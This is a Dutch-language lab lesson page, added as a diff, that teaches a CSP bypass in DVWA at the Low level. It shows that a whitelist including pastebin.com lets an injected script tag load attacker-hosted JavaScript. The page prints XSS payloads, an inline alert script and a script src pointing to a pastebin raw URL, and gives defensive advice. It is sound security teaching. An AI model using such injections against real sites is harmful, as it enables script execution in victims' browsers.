@@ -1,0 +1,90 @@
+---
+sidebar_position: 1
+sidebar_label: 'Low'
+hide_table_of_contents: true
+---
+
+import DvwaLab from '@site/src/components/DvwaLab';
+
+# CSP Bypass — Low
+
+Content Security Policy (CSP) is een HTTP-header die de browser vertelt welke bronnen betrouwbaar zijn. Het is bedoeld om XSS te blokkeren. Maar wat als de CSP zelf lek is geconfigureerd?
+
+## 1. Predict (Voorspel)
+
+De webserver stuurt de volgende CSP-header naar je browser:
+
+```
+Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com;
+```
+
+**Vraag:** Je probeert `<script>alert(1)</script>` te injecteren, maar de browser blokkeert het. Waarom lukt dezelfde aanval wél via Pastebin?
+
+<details>
+
+<summary>Antwoord</summary>
+
+De CSP vertelt de browser: "Voer alleen JavaScript uit als het afkomstig is van ons eigen domein (`self`), Pastebin, of Hastebin." Inline scripts worden geblokkeerd. Maar als je jouw kwaadaardige JavaScript op Pastebin plaatst en daarna op DVWA de tag `<script src="https://pastebin.com/raw/JOUW_ID"></script>` injecteert, controleert de browser de domeinnaam: Pastebin staat op de lijst — het script wordt uitgevoerd!
+
+</details>
+
+## 2. Run (Uitvoeren)
+
+Start het lab en bekijk het invoerveld.
+
+<DvwaLab module="csp_bypass" level="low" />
+
+> ⚠️ **Labbeperking:** Het hosten van een extern script op Pastebin is vereist voor de volledige aanval. Het lab simuleert de CSP-logica, maar de daadwerkelijke externe script-injectie werkt het best met een [lokale DVWA-installatie](/docs/dvwa_installatie).
+
+Vul een gewone naam in en klik op Submit. Observeer hoe de pagina reageert.
+
+## 3. Investigate (Onderzoeken)
+
+Vul `<script>alert(1)</script>` in het veld in en klik op Submit. Open F12 en kijk in het tabblad **Console**.
+
+**Vraag:** Welk foutbericht zie je in de Console? Wat beschrijft dit bericht over waarom jouw inline script geblokkeerd wordt?
+
+<details>
+
+<summary>Antwoord</summary>
+
+Je ziet een CSP-foutmelding zoals: `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://pastebin.com ..."`. Dit onthult dat inline `<script>`-tags standaard geblokkeerd worden tenzij de server `'unsafe-inline'` toestaat. Maar externe scripts van Pastebin worden wél toegestaan — dat is de zwakke plek.
+
+</details>
+
+## 4. Modify & Make (Aanpassen & Maken)
+
+Bouw een aanval die misbruik maakt van de slordige CSP-whitelist met een extern gehost script.
+
+<details>
+
+<summary>Tip</summary>
+
+Maak een account op Pastebin en plak daar je JavaScript-code (bijv. `alert("Hacked CSP");`). Kopieer de "Raw"-link. Gebruik dan de `src`-attributen van een `<script>`-tag om naar die link te verwijzen.
+
+</details>
+
+<details>
+
+<summary>Antwoord</summary>
+
+Vul in:
+`<script src="https://pastebin.com/raw/JOUW_ID_HIER"></script>`
+
+De browser controleert de domeinnaam (`pastebin.com`), ziet dat die op de whitelist staat, downloadt het script en voert het uit.
+
+</details>
+
+## 5. ✓ Wat moest je zien?
+
+:::tip Controle
+- Een inline `<script>alert(1)</script>` wordt door de browser geblokkeerd met een CSP-foutmelding.
+- Een extern script via `<script src="https://pastebin.com/raw/...">` wordt wél uitgevoerd.
+- Het verschil toont aan dat de CSP te breed is geconfigureerd.
+
+Wordt het externe script ook geblokkeerd? Controleer of de URL exact `https://pastebin.com/raw/...` is (niet de normale pagina-URL).
+:::
+
+## 6. Er gaat iets mis...
+
+Waarom zetten ontwikkelaars publieke platforms zoals Pastebin of Google Fonts in hun CSP? Omdat ze die platforms gebruiken voor hun eigen website (CDN's, lettertypen). Ze vergeten dat **iedereen** content kan hosten op die platforms — inclusief hackers. Zet nooit publieke, onbeheerde platforms in je CSP-whitelist.
